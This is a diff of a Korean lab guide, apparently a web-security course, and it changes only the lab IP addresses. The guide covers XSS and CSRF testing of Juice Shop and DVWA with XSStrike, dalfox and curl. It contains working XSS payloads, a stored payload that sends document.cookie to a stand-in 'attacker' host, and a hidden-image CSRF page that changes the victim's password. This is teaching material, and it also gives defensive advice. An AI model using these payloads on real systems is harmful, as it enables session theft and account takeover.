@@ -135,17 +135,17 @@ URL: http://site.com/search?q=<script>alert(1)</script>
 > cd ~/XSStrike && pip3 install -r requirements.txt
 >
 > # 1) 단일 URL 자동 점검 (모든 모드)
-> python3 ~/XSStrike/xsstrike.py -u "http://10.20.30.80:3000/rest/products/search?q=test"
+> python3 ~/XSStrike/xsstrike.py -u "http://10.20.40.81:3000/rest/products/search?q=test"
 >
 > # 2) Crawl 모드 — 사이트 전체 자동 점검
-> python3 ~/XSStrike/xsstrike.py -u http://10.20.30.80:3000 --crawl
+> python3 ~/XSStrike/xsstrike.py -u http://10.20.40.81:3000 --crawl
 >
 > # 3) WAF 우회 모드 — encoding 자동
 > python3 ~/XSStrike/xsstrike.py -u "http://target/q=FUZZ" --skip-dom
 >
 > # dalfox (Go) — 빠르고 modern
 > go install github.com/hahwul/dalfox/v2@latest
-> dalfox url "http://10.20.30.80:3000/rest/products/search?q=test" --silence
+> dalfox url "http://10.20.40.81:3000/rest/products/search?q=test" --silence
 > ```
 >
 > XSStrike 의 강점: (1) DOM/Reflected/Stored 모두 자동 탐지, (2) WAF 우회 페이로드 자동 생성, (3) HTML/JS 컨텍스트 인식 — 컨텍스트별 페이로드 매칭. dalfox 는 Go 기반으로 더 빠르고 stored 모드 지원.
@@ -171,7 +171,7 @@ PAYLOADS=(
 )
 for payload in "${PAYLOADS[@]}"; do
   encoded=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload")
-  result=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=$encoded")
+  result=$(curl -s "http://10.20.40.81:3000/rest/products/search?q=$encoded")
   if echo "$result" | grep -q "alert(1)"; then
     echo "[반사 ✓] $payload"
   else
@@ -203,12 +203,12 @@ done
 ```bash
 # Angular hash routing — # 이후는 서버 미전송, 클라이언트 처리
 curl -s -o /dev/null -w "code=%{http_code} size=%{size_download}\n" \
-  "http://10.20.30.80:3000/#/track-result?id=<iframe%20src='javascript:alert(1)'>"
+  "http://10.20.40.81:3000/#/track-result?id=<iframe%20src='javascript:alert(1)'>"
 # main JS 안의 위험 함수 빈도 (DOM XSS sink 단서)
-MAIN_JS=$(curl -s http://10.20.30.80:3000 | grep -oE 'main\.[a-f0-9]+\.js' | head -1)
+MAIN_JS=$(curl -s http://10.20.40.81:3000 | grep -oE 'main\.[a-f0-9]+\.js' | head -1)
 echo "Main JS: $MAIN_JS"
 for sink in innerHTML outerHTML document.write bypassSecurity trustAsHtml DomSanitizer; do
-  cnt=$(curl -s "http://10.20.30.80:3000/$MAIN_JS" | grep -c "$sink")
+  cnt=$(curl -s "http://10.20.40.81:3000/$MAIN_JS" | grep -c "$sink")
   printf "  %-20s : %d\n" "$sink" "$cnt"
 done
 ```
@@ -250,20 +250,20 @@ Main JS: main.bb5070bf0f9ce9b58d7c.js
 
 ```bash
 # 1) 로그인 → JWT
-TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
+TOKEN=$(curl -s -X POST http://10.20.40.81:3000/rest/user/login \
   -H 'Content-Type: application/json' \
   -d '{"email":"student@test.com","password":"Test1234!"}' \
   | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)
 
 # 2) 피드백에 XSS 페이로드 + 쿠키 탈취 코드 삽입
-curl -s -X POST http://10.20.30.80:3000/api/Feedbacks/ \
+curl -s -X POST http://10.20.40.81:3000/api/Feedbacks/ \
   -H 'Content-Type: application/json' \
   -H "Authorization: Bearer $TOKEN" \
   -d '{"comment":"<iframe src=\"javascript:fetch(`http://attacker/?c=`+document.cookie)\"></iframe>","rating":5,"captchaId":0,"captcha":"-1"}' \
   | python3 -m json.tool 2>/dev/null | head -20
 
 # 3) 저장된 피드백 조회 — XSS 페이로드 보존 여부
-curl -s http://10.20.30.80:3000/api/Feedbacks/ | python3 -c "
+curl -s http://10.20.40.81:3000/api/Feedbacks/ | python3 -c "
 import sys, json
 data = json.load(sys.stdin).get('data', [])
 print(f'Total feedbacks: {len(data)}')
@@ -305,7 +305,7 @@ Total feedbacks: 12
 
 ```bash
 # 사용자 프로필 이름에 XSS
-curl -s -X POST http://10.20.30.80:3000/api/Users/ \
+curl -s -X POST http://10.20.40.81:3000/api/Users/ \
   -H "Content-Type: application/json" \
   -d '{                                                # 요청 데이터(body)
     "email": "xss<img src=x onerror=alert(1)>@test.com",
@@ -316,7 +316,7 @@ curl -s -X POST http://10.20.30.80:3000/api/Users/ \
   }' 2>/dev/null | python3 -m json.tool 2>/dev/null
 
 # 상품 리뷰에 XSS
-curl -s -X PUT http://10.20.30.80:3000/rest/products/1/reviews \
+curl -s -X PUT http://10.20.40.81:3000/rest/products/1/reviews \
   -H "Content-Type: application/json" \
   -H "Authorization: Bearer $TOKEN" \
   -d '{                                                # 요청 데이터(body)
@@ -325,7 +325,7 @@ curl -s -X PUT http://10.20.30.80:3000/rest/products/1/reviews \
   }' 2>/dev/null
 
 # 저장된 리뷰 확인
-curl -s http://10.20.30.80:3000/rest/products/1/reviews | python3 -m json.tool 2>/dev/null | head -20  # silent 모드
+curl -s http://10.20.40.81:3000/rest/products/1/reviews | python3 -m json.tool 2>/dev/null | head -20  # silent 모드
 ```
 
 ---
@@ -349,18 +349,18 @@ http://site.com/page#<img src=x onerror=alert(1)>
 
 ```bash
 # Angular SPA — JS 소스에서 sink 함수 직접 추출 + 컨텍스트 확인
-MAIN_JS=$(curl -s http://10.20.30.80:3000 | grep -oE 'main\.[a-f0-9]+\.js' | head -1)
-echo "Main JS: $MAIN_JS (size: $(curl -sI http://10.20.30.80:3000/$MAIN_JS | grep -i content-length | tr -d '\r'))"
+MAIN_JS=$(curl -s http://10.20.40.81:3000 | grep -oE 'main\.[a-f0-9]+\.js' | head -1)
+echo "Main JS: $MAIN_JS (size: $(curl -sI http://10.20.40.81:3000/$MAIN_JS | grep -i content-length | tr -d '\r'))"
 
 # bypassSecurityTrustHtml 호출 위치 grep — 가장 위험한 패턴
-curl -s "http://10.20.30.80:3000/$MAIN_JS" | grep -oE '.{0,40}bypassSecurityTrustHtml.{0,60}' | head -5
+curl -s "http://10.20.40.81:3000/$MAIN_JS" | grep -oE '.{0,40}bypassSecurityTrustHtml.{0,60}' | head -5
 
 # DOM XSS 테스트 URL 매트릭스 (각 페이로드 별 사용 source)
 cat <<'EOF'
 [테스트 URL — 브라우저 직접 실행 필요]
-1. http://10.20.30.80:3000/#/search?q=<iframe src="javascript:alert(`xss`)">
-2. http://10.20.30.80:3000/#/track-result?id=<svg onload=alert(1)>
-3. http://10.20.30.80:3000/#/contact?msg=<img src=x onerror=alert(document.cookie)>
+1. http://10.20.40.81:3000/#/search?q=<iframe src="javascript:alert(`xss`)">
+2. http://10.20.40.81:3000/#/track-result?id=<svg onload=alert(1)>
+3. http://10.20.40.81:3000/#/contact?msg=<img src=x onerror=alert(document.cookie)>
 [Source]: location.hash → [Sink]: innerHTML / bypassSecurityTrustHtml
 EOF
 ```
@@ -372,9 +372,9 @@ this.sanitizer.bypassSecurityTrustHtml(this.searchValue)
 this.sanitizer.bypassSecurityTrustHtml(t.element.outerHTML)
 this.sanitizer.bypassSecurityTrustHtml(this.lastLoginIp)
 [테스트 URL — 브라우저 직접 실행 필요]
-1. http://10.20.30.80:3000/#/search?q=<iframe src="javascript:alert(`xss`)">
-2. http://10.20.30.80:3000/#/track-result?id=<svg onload=alert(1)>
-3. http://10.20.30.80:3000/#/contact?msg=<img src=x onerror=alert(document.cookie)>
+1. http://10.20.40.81:3000/#/search?q=<iframe src="javascript:alert(`xss`)">
+2. http://10.20.40.81:3000/#/track-result?id=<svg onload=alert(1)>
+3. http://10.20.40.81:3000/#/contact?msg=<img src=x onerror=alert(document.cookie)>
 ```
 
 > **해석 — Source→Sink 추적 = DOM XSS 정밀 분석**:
@@ -420,15 +420,15 @@ CSRF는 인증된 사용자가 자신도 모르게 의도하지 않은 요청을
 ```bash
 # 1) HTML 에 CSRF 토큰 hidden 필드 존재 여부
 echo '=== HTML CSRF token 검사 ==='
-curl -s http://10.20.30.80:3000 | grep -ciE 'csrf|_token|xsrf' || echo '(0건)'
+curl -s http://10.20.40.81:3000 | grep -ciE 'csrf|_token|xsrf' || echo '(0건)'
 
 # 2) Set-Cookie 헤더 + SameSite 속성 검사
 echo '=== Set-Cookie 분석 ==='
-curl -sI http://10.20.30.80:3000 | grep -i 'set-cookie' || echo '(Set-Cookie 헤더 없음)'
+curl -sI http://10.20.40.81:3000 | grep -i 'set-cookie' || echo '(Set-Cookie 헤더 없음)'
 
 # 3) 로그인 후 쿠키 / JWT 인증 방식 확인
 echo '=== 로그인 응답 헤더 ==='
-curl -s -I -X POST http://10.20.30.80:3000/rest/user/login \
+curl -s -I -X POST http://10.20.40.81:3000/rest/user/login \
   -H 'Content-Type: application/json' \
   -d '{"email":"student@test.com","password":"Test1234!"}' | grep -iE 'set-cookie|access-control'
 ```
@@ -448,7 +448,7 @@ Access-Control-Allow-Credentials: true
 > - **CSRF 토큰 0건** = HTML 폼 미사용 = SPA 기반. **그러나 JWT 가 Authorization 헤더로 전송되면 CSRF 안전** (브라우저가 자동 첨부 X).
 > - **Set-Cookie: language=en** = i18n 쿠키. **HttpOnly/Secure/SameSite 모두 누락** = 양호한 정책 미설정. 그러나 인증 X 쿠키라 critical 아님.
 > - **Access-Control-Allow-Origin: \*** = ★ critical. **`*` 와일드카드 + `Allow-Credentials: true` 조합** = CORS 무효화 = JS 가 다른 origin 에서 자격증명 포함 요청 가능 → **CSRF 위협 부활**.
-> - **공격 흐름**: (1) 피해자 JuiceShop 로그인 (JWT 받음 + localStorage 저장) → (2) 악성 사이트 방문 → (3) 악성 JS 가 `fetch('http://10.20.30.80:3000/rest/user/...', {credentials:'include'})` → (4) CORS `*` 통과 → JuiceShop 요청 처리.
+> - **공격 흐름**: (1) 피해자 JuiceShop 로그인 (JWT 받음 + localStorage 저장) → (2) 악성 사이트 방문 → (3) 악성 JS 가 `fetch('http://10.20.40.81:3000/rest/user/...', {credentials:'include'})` → (4) CORS `*` 통과 → JuiceShop 요청 처리.
 > - **JuiceShop 의 의도적 약점**. 운영 환경 CORS 는 `Allow-Origin: <특정 도메인>` 으로 제한 + `Allow-Credentials: true` 결합 시만 사용.
 
 ### 5.3 CSRF 공격 시나리오 (개념)
@@ -459,10 +459,10 @@ Access-Control-Allow-Credentials: true
 <body>
 <h1>축하합니다! 상품권 당첨!</h1>
 <!-- 숨겨진 요청: 피해자의 비밀번호를 변경 -->
-<img src="http://10.20.30.80:3000/rest/user/change-password?new=hacked123&repeat=hacked123" style="display:none">
+<img src="http://10.20.40.81:3000/rest/user/change-password?new=hacked123&repeat=hacked123" style="display:none">
 
 <!-- 또는 폼을 이용한 POST CSRF -->
-<form action="http://10.20.30.80:3000/api/Feedbacks/" method="POST" id="csrf-form">
+<form action="http://10.20.40.81:3000/api/Feedbacks/" method="POST" id="csrf-form">
   <input type="hidden" name="comment" value="CSRF로 작성된 피드백">
   <input type="hidden" name="rating" value="1">
 </form>
@@ -475,13 +475,13 @@ Access-Control-Allow-Credentials: true
 
 ```bash
 # CSRF 토큰 없이 GET 메서드로 비번 변경 시도
-TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
+TOKEN=$(curl -s -X POST http://10.20.40.81:3000/rest/user/login \
   -H 'Content-Type: application/json' \
   -d '{"email":"student@test.com","password":"Test1234!"}' \
   | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)
 
 # ★ GET 으로 상태 변경 — CSRF 의 가장 위험한 패턴
-curl -s "http://10.20.30.80:3000/rest/user/change-password?current=Test1234!&new=Hacked9!&repeat=Hacked9!" \
+curl -s "http://10.20.40.81:3000/rest/user/change-password?current=Test1234!&new=Hacked9!&repeat=Hacked9!" \
   -H "Authorization: Bearer $TOKEN" | python3 -m json.tool 2>/dev/null
 ```
 
@@ -500,7 +500,7 @@ curl -s "http://10.20.30.80:3000/rest/user/change-password?current=Test1234!&new
 > - **GET + Query string 으로 비번 변경 성공** = critical. RFC 7231 위반 (GET 은 idempotent + safe = 상태 변경 X).
 > - **JuiceShop challenge ID**: 'CSRF' (3★). 정답 = GET 으로 변경 + Authorization 헤더 누락 시도.
 > - **응답에 새 비번 hash 포함** = 추가 정보 노출. MD5 (`06ba8a4ec3eb71c6a06d04b2898c69e9` = `Hacked9!`) — bcrypt 미사용.
-> - **공격 시나리오**: (1) 피해자 로그인 + JWT localStorage 저장 → (2) 악성 사이트의 `<img src="http://10.20.30.80:3000/rest/user/change-password?...">` → (3) 브라우저 자동 GET 요청 (단, JWT 가 Authorization 헤더라 자동 첨부 X) → (4) **그러나 CORS `*` + `Credentials: true` 환경이면 fetch 로 가능**.
+> - **공격 시나리오**: (1) 피해자 로그인 + JWT localStorage 저장 → (2) 악성 사이트의 `<img src="http://10.20.40.81:3000/rest/user/change-password?...">` → (3) 브라우저 자동 GET 요청 (단, JWT 가 Authorization 헤더라 자동 첨부 X) → (4) **그러나 CORS `*` + `Credentials: true` 환경이면 fetch 로 가능**.
 > - **권고 (다층)**: (1) GET 메서드 절대 X (POST/PUT 만), (2) CSRF 토큰 (synchronizer pattern), (3) SameSite=Strict 쿠키, (4) Origin 헤더 검증, (5) 민감 작업 재인증 (current 비번 재입력).
 
 ---
@@ -521,12 +521,12 @@ curl -s "http://10.20.30.80:3000/rest/user/change-password?current=Test1234!&new
 
 ```bash
 # 보안 헤더 6종 동시 점검
-curl -sI http://10.20.30.80:3000 | grep -iE \
+curl -sI http://10.20.40.81:3000 | grep -iE \
   'content-security-policy|x-frame-options|x-content-type-options|x-xss-protection|strict-transport-security|referrer-policy' \
   | sed 's/^/  /'
 echo '---'
 echo '[누락 헤더 카운트]'
-HEADERS=$(curl -sI http://10.20.30.80:3000)
+HEADERS=$(curl -sI http://10.20.40.81:3000)
 for h in 'Content-Security-Policy' 'X-Frame-Options' 'X-Content-Type-Options' 'Strict-Transport-Security' 'Referrer-Policy' 'Permissions-Policy'; do
   echo "$HEADERS" | grep -qi "$h" && echo "  ✓ $h" || echo "  ✗ $h (누락)"
 done
@@ -600,9 +600,9 @@ done
 
 ### DVWA 보안 레벨 변경 방법 (웹 UI)
 
-> **DVWA URL:** `http://10.20.30.80:8080`
+> **DVWA URL:** `http://10.20.40.82:80`
 
-1. 브라우저에서 `http://10.20.30.80:8080` 접속 → 로그인 (admin / password)
+1. 브라우저에서 `http://10.20.40.82:80` 접속 → 로그인 (admin / password)
 2. 좌측 메뉴 **DVWA Security** 클릭
 3. **Security Level** 드롭다운에서 레벨 선택:
    - **Low**: XSS/CSRF 필터 없음 → 기본 스크립트 삽입 테스트
@@ -621,7 +621,7 @@ done
 
 ### Burp Suite Community
 > **역할:** 웹 프록시 기반 수동/반자동 취약점 점검 도구  
-> **실행 위치:** `작업 PC → web (10.20.30.80:3000)`  
+> **실행 위치:** `작업 PC → web (10.20.40.81:3000)`  
 > **접속/호출:** GUI `burpsuite`, CA 인증서 신뢰 필요 (`http://burp`)
 
 **주요 경로·파일**
